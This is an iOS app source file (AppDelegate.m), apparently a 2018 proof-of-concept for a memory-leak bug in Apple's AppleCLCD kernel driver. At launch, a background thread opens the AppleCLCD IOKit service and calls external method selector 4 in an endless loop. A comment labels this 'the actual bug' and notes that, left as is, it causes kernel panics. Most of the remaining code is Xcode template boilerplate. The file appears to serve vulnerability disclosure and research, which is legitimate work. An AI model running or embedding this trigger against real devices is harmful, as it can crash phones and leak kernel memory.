//
//  AppDelegate.m
//  AppleCLCD-memleak
//
//  Created by Abraham Masri on 1/14/18.
//  Copyright © 2018 cheesecakeufo. All rights reserved.
//

#import "AppDelegate.h"
#include <mach/mach.h>

@interface AppDelegate ()

@end

@implementation AppDelegate

/* IOKit stuff */
typedef mach_port_t    io_object_t;
typedef io_object_t    io_connect_t;
typedef io_object_t    io_service_t;

io_service_t
IOServiceGetMatchingService(
                            mach_port_t    masterPort,
                            CFDictionaryRef    matching );

extern
const mach_port_t kIOMasterPortDefault;

CFMutableDictionaryRef
IOServiceMatching(
                  const char *    name );

kern_return_t
IOServiceOpen(
              io_service_t    service,
              task_port_t    owningTask,
              uint32_t    type,
              io_connect_t  *    connect );

kern_return_t
IOConnectCallScalarMethod(
                          mach_port_t     connection,
                          uint32_t     selector,
                          const uint64_t    *input,
                          uint32_t     inputCnt,
                          uint64_t    *output,
                          uint32_t    *outputCnt);
/* end */

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        
        io_service_t service = IOServiceGetMatchingService(
                                                           kIOMasterPortDefault,
                                                           IOServiceMatching("AppleCLCD"));
        io_connect_t connect;
        kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0, &connect);
        
        while(1) {
            uint64_t output = 0x8badf00d;
            uint32_t outputCnt = 1;
            
            /* the actual bug */
            ret = IOConnectCallScalarMethod(
                                            connect, 4 /* selector */,
                                            NULL /* input */, 0 /* inputCnt */,
                                            &output /*output*/, &outputCnt /* outputCnt */);
            
            // uncomment the next two lines if you don't want panics
            // printf("ret: 0x%08x, output: 0x%llx, outputCnt: %x \n", ret, output, outputCnt);
            // usleep(100);
        }
        
    });
    
    
    
    
    
    return YES;
}


- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
}


- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}


- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
}


- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}


- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}


@end
